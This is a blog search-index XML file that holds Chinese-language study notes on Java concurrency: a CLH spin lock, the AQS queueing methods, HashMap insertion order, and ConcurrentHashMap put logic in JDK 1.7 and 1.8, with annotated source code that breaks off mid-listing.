<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AQS</title>
    <url>/2020/09/12/AQS/</url>
    <content><![CDATA[<h2 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h2><h3 id="CLH"><a href="#CLH" class="headerlink" title="CLH"></a>CLH</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hand.hcf.app.base.bigdata;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicReference;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> * https://github.com/yuanmabiji/Java-SourceCode-Blogs</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// CLHLock.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CLHLock</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * CLH锁节点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CLHNode</span> &#123;</span><br><span class="line">        <span class="comment">// 锁状态：默认为false，表示线程没有获取到锁；true表示线程获取到锁或正在等待</span></span><br><span class="line">        <span class="comment">// 为了保证locked状态是线程间可见的，因此用volatile关键字修饰</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">locked</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 尾结点，总是指向最后一个CLHNode节点</span></span><br><span class="line">    <span class="comment">// 【注意】这里用了java的原子系列之AtomicReference，能保证原子更新</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AtomicReference&lt;CLHNode&gt; tailNode;</span><br><span class="line">    <span class="comment">// 当前节点的前继节点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ThreadLocal&lt;CLHNode&gt; predNode;</span><br><span class="line">    <span class="comment">// 当前节点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ThreadLocal&lt;CLHNode&gt; curNode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CLHLock构造函数，用于新建CLH锁节点时做一些初始化逻辑</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CLHLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化前继节点，注意此时前继节点没有存储CLHNode对象，存储的是null</span></span><br><span class="line">        predNode = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 初始化当前的CLH节点</span></span><br><span class="line">        curNode = ThreadLocal.withInitial(CLHNode::<span class="keyword">new</span>);</span><br><span class="line">        <span class="comment">// 初始化时尾结点指向一个空的CLH节点</span></span><br><span class="line">        <span class="comment">// 为啥？ 第一个获取锁的不就一定会把 tailNode 指向有node的cur节点，但是同时返回了null 给 preNode，导致锁判定空指针</span></span><br><span class="line">        tailNode = <span class="keyword">new</span> <span class="title class_">AtomicReference</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">CLHNode</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取锁</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 取出当前线程ThreadLocal存储的当前节点，初始化值总是一个新建的CLHNode，locked状态为false。</span></span><br><span class="line">        <span class="type">CLHNode</span> <span class="variable">currNode</span> <span class="operator">=</span> curNode.get();</span><br><span class="line">        <span class="comment">// 此时把lock状态置为true，表示一个有效状态，</span></span><br><span class="line">        <span class="comment">// 即获取到了锁或正在等待锁的状态</span></span><br><span class="line">        currNode.locked = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 当一个线程到来时，总是将尾结点取出来赋值给当前线程的前继节点；</span></span><br><span class="line">        <span class="comment">// 然后再把当前线程的当前节点赋值给尾节点</span></span><br><span class="line">        <span class="comment">// 【注意】在多线程并发情况下，这里通过AtomicReference类能防止并发问题</span></span><br><span class="line">        <span class="comment">// 【注意】哪个线程先执行到这里就会先执行predNode.set(preNode);语句，因此构建了一条逻辑线程等待链</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----**这条链避免了线程饥饿现象发生**----</span></span><br><span class="line"></span><br><span class="line">        <span class="type">CLHNode</span> <span class="variable">preNode</span> <span class="operator">=</span> tailNode.getAndSet(currNode);</span><br><span class="line">        <span class="comment">// 将刚获取的尾结点（前一线程的当前节点）付给当前线程的前继节点ThreadLocal</span></span><br><span class="line">        <span class="comment">// 【思考】这句代码也可以去掉吗，如果去掉有影响吗？</span></span><br><span class="line">        <span class="comment">// 可以，因为临时变量持有着前节点的引用，其实就相当于一个 TL 即可，predNode的意义不大</span></span><br><span class="line">        predNode.set(preNode);</span><br><span class="line">        <span class="comment">// 【1】若前继节点的locked状态为false，则表示获取到了锁，不用自旋等待；</span></span><br><span class="line">        <span class="comment">// 【2】若前继节点的locked状态为true，则表示前一线程获取到了锁或者正在等待，自旋等待</span></span><br><span class="line">        <span class="keyword">while</span> (preNode.locked) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程&quot;</span> + Thread.currentThread().getName() + <span class="string">&quot;没能获取到锁，进行自旋等待。。。&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 能执行到这里，说明当前线程获取到了锁</span></span><br><span class="line">        System.out.println(<span class="string">&quot;线程&quot;</span> + Thread.currentThread().getName() + <span class="string">&quot;获取到了锁！！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放锁</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 获取当前线程的当前节点</span></span><br><span class="line">        <span class="type">CLHNode</span> <span class="variable">node</span> <span class="operator">=</span> curNode.get();</span><br><span class="line">        <span class="comment">// 进行解锁操作</span></span><br><span class="line">        <span class="comment">// 这里将locked至为false，此时执行了lock方法正在自旋等待的后继节点将会获取到锁</span></span><br><span class="line">        <span class="comment">// 【注意】而不是所有正在自旋等待的线程去并发竞争锁，</span></span><br><span class="line">        <span class="comment">// 因为此时除了第一个拿到锁的线程，其他线程都还没获取锁，或者获取了锁但是却在疯狂自旋</span></span><br><span class="line">        node.locked = <span class="literal">false</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;线程&quot;</span> + Thread.currentThread().getName() + <span class="string">&quot;释放了锁！！！&quot;</span>);</span><br><span class="line">        <span class="comment">// 小伙伴们可以思考下，下面两句代码的作用是什么？？</span></span><br><span class="line">        <span class="comment">// 防只有 a线程工作时， 释放了锁以后，再次获取锁异常</span></span><br><span class="line">        <span class="comment">// A 获取锁后释放，此时tailNode 和 curNode 指向同一个，而predNode 指向了之前的 tailNode</span></span><br><span class="line">        <span class="comment">// 此时 若A仍和tailNode 持有同一个对象</span></span><br><span class="line">        <span class="comment">// lock 时，curNode 设置为 true，tailNode 对应也就是 true了，这样 predNode 就会自己等自己</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 但是如果说指向新节点，那么获取锁后释放，再次lock 时， curNode 设置为 true， 但 tailNode 没变，仍然是之前的false，</span></span><br><span class="line">        <span class="comment">// 这样 predNode 就可以了</span></span><br><span class="line">        <span class="type">CLHNode</span> <span class="variable">newCurNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CLHNode</span>();</span><br><span class="line">        curNode.set(newCurNode);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 【优化】能提高GC效率和节省内存空间，请思考：这是为什么？</span></span><br><span class="line">        <span class="comment">// curNode.set(predNode.get());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="AQS-0-独占"><a href="#AQS-0-独占" class="headerlink" title="AQS[0] 独占"></a>AQS[0] 独占</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 头结点: 当前持有锁的线程 队列不包含该节点</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Node head;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 阻塞的尾节点，每个新的节点进来，都插入到最后，也就形成了一个链表</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Node tail;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个是最重要的，代表当前锁的状态，0代表没有被占用，大于 0 代表有线程持有当前锁</span></span><br><span class="line"><span class="comment">// 这个值可以大于 1，是因为锁可以重入，每次重入都加上 1</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> state;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代表当前持有独占锁的线程，举个最重要的使用例子，因为锁可以重入</span></span><br><span class="line"><span class="comment">// reentrantLock.lock()可以嵌套调用多次，所以每次用这个来判断当前线程是否已经拥有了锁</span></span><br><span class="line"><span class="comment">// if (currentThread == getExclusiveOwnerThread()) &#123;state++&#125;</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Thread exclusiveOwnerThread; <span class="comment">//继承自AbstractOwnableSynchronizer</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Inserts node into queue, initializing if necessary. See picture above.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node to insert</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> node&#x27;s predecessor</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 采用自旋的方式入队</span></span><br><span class="line">    <span class="comment">// 之前说过，到这个方法只有两种可能：等待队列为空，或者有线程竞争入队，</span></span><br><span class="line">    <span class="comment">// 自旋在这边的语义是：CAS设置tail过程中，竞争一次竞争不到，我就多次竞争，总会排到的</span></span><br><span class="line">    <span class="keyword">private</span> Node <span class="title function_">enq</span><span class="params">(<span class="keyword">final</span> Node node)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">t</span> <span class="operator">=</span> tail;</span><br><span class="line">            <span class="comment">// 之前说过，队列为空也会进来这里</span></span><br><span class="line">            <span class="keyword">if</span> (t == <span class="literal">null</span>) &#123; <span class="comment">// Must initialize</span></span><br><span class="line">                <span class="comment">// 初始化head节点</span></span><br><span class="line">                <span class="comment">// 细心的读者会知道原来 head 和 tail 初始化的时候都是 null 的</span></span><br><span class="line">                <span class="comment">// 还是一步CAS，你懂的，现在可能是很多线程同时进来呢</span></span><br><span class="line">                <span class="keyword">if</span> (compareAndSetHead(<span class="keyword">new</span> <span class="title class_">Node</span>()))</span><br><span class="line">                    <span class="comment">// 给后面用：这个时候head节点的waitStatus==0, 看new Node()构造方法就知道了</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 这个时候有了head，但是tail还是null，设置一下，</span></span><br><span class="line">                    <span class="comment">// 把tail指向head，放心，马上就有线程要来了，到时候tail就要被抢了</span></span><br><span class="line">                    <span class="comment">// 注意：这里只是设置了tail=head，这里可没return哦，没有return，没有return</span></span><br><span class="line">                    <span class="comment">// 所以，设置完了以后，继续for循环，下次就到下面的else分支了</span></span><br><span class="line">                    tail = head;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 下面几行，和上一个方法 addWaiter 是一样的，</span></span><br><span class="line">                <span class="comment">// 只是这个套在无限循环里，反正就是将当前线程排到队尾，有线程竞争的话排不上重复排</span></span><br><span class="line">                node.prev = t;</span><br><span class="line">        <span class="comment">// 如果第一次set tail了后发生了线程切换，因而采用 CAS</span></span><br><span class="line">                <span class="keyword">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class="line">                    t.next = node;</span><br><span class="line">                    <span class="keyword">return</span> t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>acquireQueued</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 现在，又回到这段代码了</span></span><br><span class="line">   <span class="comment">// if (!tryAcquire(arg) </span></span><br><span class="line">   <span class="comment">//        &amp;&amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) </span></span><br><span class="line">   <span class="comment">//     selfInterrupt();</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 这里假设addWaiter 返回 tail节点后，tail节点就被其他线程cas替换掉了，其实这对下面的分析是没有影响的，上面的设置tail的最终目的是为了 使链表构成 并tail标志末尾，tail标志末尾的语义没有改变即可，</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 下面这个方法，参数node，经过addWaiter(Node.EXCLUSIVE)，此时已经进入阻塞队列</span></span><br><span class="line">   <span class="comment">// 注意一下：如果acquireQueued(addWaiter(Node.EXCLUSIVE), arg))返回true的话，</span></span><br><span class="line">   <span class="comment">// 意味着上面这段代码将进入selfInterrupt()，所以正常情况下，下面应该返回false</span></span><br><span class="line">   <span class="comment">// 这个方法非常重要，应该说真正的线程挂起，然后被唤醒后去获取锁，都在这个方法里了</span></span><br><span class="line">   <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">acquireQueued</span><span class="params">(<span class="keyword">final</span> Node node, <span class="type">int</span> arg)</span> &#123;</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">failed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">boolean</span> <span class="variable">interrupted</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">           <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">p</span> <span class="operator">=</span> node.predecessor();</span><br><span class="line">               <span class="comment">// p == head 说明当前节点虽然进到了阻塞队列，但是是阻塞队列的第一个，因为它的前驱是head</span></span><br><span class="line">               <span class="comment">// 注意，阻塞队列不包含head节点，head一般指的是占有锁的线程，head后面的才称为阻塞队列</span></span><br><span class="line">               <span class="comment">// 所以当前节点可以去试抢一下锁</span></span><br><span class="line">               <span class="comment">// 这里我们说一下，为什么可以去试试：</span></span><br><span class="line">               <span class="comment">// 首先，它是队头，这个是第一个条件，其次，当前的head有可能是刚刚初始化的node，</span></span><br><span class="line">               <span class="comment">// enq(node) 方法里面有提到，head是延时初始化的，而且new Node()的时候没有设置任何线程</span></span><br><span class="line">               <span class="comment">// 也就是说，当前的head不属于任何一个线程，所以作为队头，可以去试一试，</span></span><br><span class="line">               <span class="comment">// tryAcquire已经分析过了, 忘记了请往前看一下，就是简单用CAS试操作一下state</span></span><br><span class="line">               <span class="keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class="line">                   setHead(node);</span><br><span class="line">                   p.next = <span class="literal">null</span>; <span class="comment">// help GC</span></span><br><span class="line">                   failed = <span class="literal">false</span>;</span><br><span class="line">                   <span class="keyword">return</span> interrupted;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">// 到这里，说明上面的if分支没有成功，要么当前node本来就不是队头，</span></span><br><span class="line">               <span class="comment">// 要么就是tryAcquire(arg)没有抢赢别人，继续往下看</span></span><br><span class="line">               <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class="line">                   parkAndCheckInterrupt())</span><br><span class="line">                   interrupted = <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="comment">// 什么时候 failed 会为 true???</span></span><br><span class="line">           <span class="comment">// tryAcquire() 方法抛异常的情况</span></span><br><span class="line">           <span class="keyword">if</span> (failed)</span><br><span class="line">               cancelAcquire(node);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>AQS</tag>
        <tag>Concurrency</tag>
      </tags>
  </entry>
  <entry>
    <title>Java HashMap &amp; Concurrent Hash Map</title>
    <url>/2020/08/09/HashMap/</url>
    <content><![CDATA[<ol>
<li><p>为啥拉链用尾插不用头插？</p>
<ul>
<li>jdk 1.7 用的头插，但头插的问题就是resize：因为hash取值后放置是从后往前(头插，逆序链表方向)的，但是在resize时会重计算hash，此时是顺序遍历方向，那么就可能出现一开始A头插在B前，rehash时B<br> 后进行rehash导致B<br> 头插在A前。这样AB的顺序resize后就不同了。这样就会使得多线程时对引用的指向调整有问题，有可能造成循环链表了。尾插法的顺序和rehash时遍历的顺序一致自然就不会有这个问题。</li>
</ul>
</li>
<li><p>Collections.synchronizedMap</p>
<p> 内部维护了一个 map 用来引用需要改造的map，通过加 mutex 排他锁的形式来对map进行各种操作。其实就是全部用 synchronized 包裹起来。</p>
</li>
<li><p>fail-safe &amp; fail-fast</p>
<p> hashtable 使用的是 fail-safe 机制，该机制会在进入遍历前，记录当前集合的内容，然后遍历记录的集合内容，不关心集合在此期间的意外修改情况。类似得还有 copyOnWriteList</p>
<p> fail-fast: 每次集合变动会使得 modCount 跟着变动，而使用 next 遍历前会检查这个 modCount 是否是期望值。</p>
</li>
</ol>
<h3 id="Concurrent-Hash-Map"><a href="#Concurrent-Hash-Map" class="headerlink" title="Concurrent Hash Map"></a>Concurrent Hash Map</h3><ol>
<li>1.7 版本的分段方式 segment</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先定位 segment，对 segment后进行put操作</span></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    Segment&lt;K,V&gt; s;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();<span class="comment">//这就是为啥他不可以put null值的原因</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> (hash &gt;&gt;&gt; segmentShift) &amp; segmentMask;</span><br><span class="line">    <span class="keyword">if</span> ((s = (Segment&lt;K,V&gt;)UNSAFE.getObject          </span><br><span class="line">         (segments, (j &lt;&lt; SSHIFT) + SBASE)) == <span class="literal">null</span>) </span><br><span class="line">        s = ensureSegment(j);</span><br><span class="line">    <span class="keyword">return</span> s.put(key, hash, value, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">put</span><span class="params">(K key, <span class="type">int</span> hash, V value, <span class="type">boolean</span> onlyIfAbsent)</span> &#123;</span><br><span class="line">          <span class="comment">// 将当前 Segment 中的 table 通过 key 的 hashcode 定位到 HashEntry</span></span><br><span class="line">            HashEntry&lt;K,V&gt; node = tryLock() ? <span class="literal">null</span> :</span><br><span class="line">                scanAndLockForPut(key, hash, value);</span><br><span class="line">            V oldValue;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                HashEntry&lt;K,V&gt;[] tab = table;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (tab.length - <span class="number">1</span>) &amp; hash;</span><br><span class="line">                HashEntry&lt;K,V&gt; first = entryAt(tab, index);</span><br><span class="line">                <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = first;;) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line">                        K k;</span><br><span class="line"> <span class="comment">// 遍历该 HashEntry，如果不为空则判断传入的 key 和当前遍历的 key 是否相等，相等则覆盖旧的 value。</span></span><br><span class="line">                        <span class="keyword">if</span> ((k = e.key) == key ||</span><br><span class="line">                            (e.hash == hash &amp;&amp; key.equals(k))) &#123;</span><br><span class="line">                            oldValue = e.value;</span><br><span class="line">                            <span class="keyword">if</span> (!onlyIfAbsent) &#123;</span><br><span class="line">                                e.value = value;</span><br><span class="line">                                ++modCount;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        e = e.next;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="comment">// 不为空则需要新建一个 HashEntry 并加入到 Segment 中，同时会先判断是否需要扩容。</span></span><br><span class="line">                        <span class="keyword">if</span> (node != <span class="literal">null</span>)</span><br><span class="line">                            node.setNext(first);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            node = <span class="keyword">new</span> <span class="title class_">HashEntry</span>&lt;K,V&gt;(hash, key, value, first);</span><br><span class="line">                        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> count + <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">if</span> (c &gt; threshold &amp;&amp; tab.length &lt; MAXIMUM_CAPACITY)</span><br><span class="line">                            rehash(node);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            setEntryAt(tab, index, node);</span><br><span class="line">                        ++modCount;</span><br><span class="line">                        count = c;</span><br><span class="line">                        oldValue = <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">               <span class="comment">//释放锁</span></span><br><span class="line">                unlock();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>1.8 版本的 CAS + synchronized</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(K key, V value, <span class="type">boolean</span> onlyIfAbsent)</span> &#123;</span><br><span class="line"> <span class="comment">//可以看到，在并发情况下，key 和 value 都是不支持为空的。</span></span><br><span class="line"> <span class="keyword">if</span> (key == <span class="literal">null</span> || value == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line"> <span class="comment">//这里和1.8 HashMap 的hash 方法大同小异，只是多了一个操作，如下</span></span><br><span class="line"> <span class="comment">//( h ^ (h &gt;&gt;&gt; 16)) &amp; HASH_BITS;  HASH_BITS = 0x7fffffff;</span></span><br><span class="line"> <span class="comment">// 0x7fffffff ，二进制为 0111 1111 1111 1111 1111 1111 1111 1111 。</span></span><br><span class="line"> <span class="comment">//所以，hash值除了做了高低位异或运算，还多了一步，保证最高位的 1 个 bit 位总是0。</span></span><br><span class="line"> <span class="comment">//这里，我并没有明白它的意图，仅仅是保证计算出来的hash值不超过 Integer 最大值，且不为负数吗。</span></span><br><span class="line"> <span class="comment">//同 HashMap 的hash 方法对比一下，会发现连源码注释都是相同的，并没有多说明其它的。</span></span><br><span class="line"> <span class="comment">//我个人认为意义不大，因为最后 hash 是为了和 capacity -1 做与运算，而 capacity 最大值为 1&lt;&lt;30，</span></span><br><span class="line"> <span class="comment">//即 0100 0000 0000 0000 0000 0000 0000 0000 ，减1为 0011 1111 1111 1111 1111 1111 1111 1111。</span></span><br><span class="line"> <span class="comment">//即使 hash 最高位为 1(无所谓0)，也不影响最后的结果，最高位也总会是0.</span></span><br><span class="line"> <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> spread(key.hashCode());</span><br><span class="line"> <span class="comment">//用来计算当前链表上的元素个数</span></span><br><span class="line"> <span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span> (Node&lt;K,V&gt;[] tab = table;;) &#123;</span><br><span class="line">  Node&lt;K,V&gt; f; <span class="type">int</span> n, i, fh;</span><br><span class="line">  <span class="comment">//如果表为空，则说明还未初始化。</span></span><br><span class="line">  <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">   <span class="comment">//初始化表，只有一个线程可以初始化成功。</span></span><br><span class="line">   tab = initTable();</span><br><span class="line">  <span class="comment">//若表已经初始化，则找到当前 key 所在的桶，并且判断是否为空</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i = (n - <span class="number">1</span>) &amp; hash)) == <span class="literal">null</span>) &#123;</span><br><span class="line">   <span class="comment">//若当前桶为空，则通过 CAS 原子操作，把新节点插入到此位置，</span></span><br><span class="line">   <span class="comment">//这保证了只有一个线程可以 CAS 成功，其它线程都会失败。</span></span><br><span class="line">   <span class="keyword">if</span> (casTabAt(tab, i, <span class="literal">null</span>,</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(hash, key, value, <span class="literal">null</span>)))</span><br><span class="line">    <span class="keyword">break</span>;                   <span class="comment">// no lock when adding to empty bin</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//若所在桶不为空，则判断节点的 hash 值是否为 MOVED（值是-1）</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">   <span class="comment">//若为-1，说明当前数组正在进行扩容，则需要当前线程帮忙迁移数据</span></span><br><span class="line">   tab = helpTransfer(tab, f);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="type">V</span> <span class="variable">oldVal</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="comment">//这里用加同步锁的方式，来保证线程安全，给桶中第一个节点对象加锁</span></span><br><span class="line">   <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">    <span class="comment">//recheck 一下，保证当前桶的第一个节点无变化，后边很多这样类似的操作，不再赘述</span></span><br><span class="line">    <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">     <span class="comment">//如果hash值大于等于0，说明是正常的链表结构</span></span><br><span class="line">     <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      binCount = <span class="number">1</span>;</span><br><span class="line">      <span class="comment">//从头结点开始遍历，每遍历一次，binCount计数加1</span></span><br><span class="line">      <span class="keyword">for</span> (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">       K ek;</span><br><span class="line">       <span class="comment">//如果找到了和当前 key 相同的节点，则用新值替换旧值</span></span><br><span class="line">       <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">        ((ek = e.key) == key ||</span><br><span class="line">         (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">        oldVal = e.val;</span><br><span class="line">        <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">         e.val = value;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       Node&lt;K,V&gt; pred = e;</span><br><span class="line">       <span class="comment">//若遍历到了尾结点，则把新节点尾插进去</span></span><br><span class="line">       <span class="keyword">if</span> ((e = e.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">        pred.next = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(hash, key,</span><br><span class="line">                value, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//否则判断是否是树节点。这里提一下，TreeBin只是头结点对TreeNode的再封装</span></span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123;</span><br><span class="line">      Node&lt;K,V&gt; p;</span><br><span class="line">      binCount = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,</span><br><span class="line">                value)) != <span class="literal">null</span>) &#123;</span><br><span class="line">       oldVal = p.val;</span><br><span class="line">       <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">        p.val = value;</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//注意下，这个判断是在同步锁外部，因为 treeifyBin内部也有同步锁，并不影响</span></span><br><span class="line">   <span class="keyword">if</span> (binCount != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//如果节点个数大于等于 8，则转化为红黑树</span></span><br><span class="line">    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD)</span><br><span class="line">     treeifyBin(tab, i);</span><br><span class="line">    <span class="comment">//把旧节点值返回</span></span><br><span class="line">    <span class="keyword">if</span> (oldVal != <span 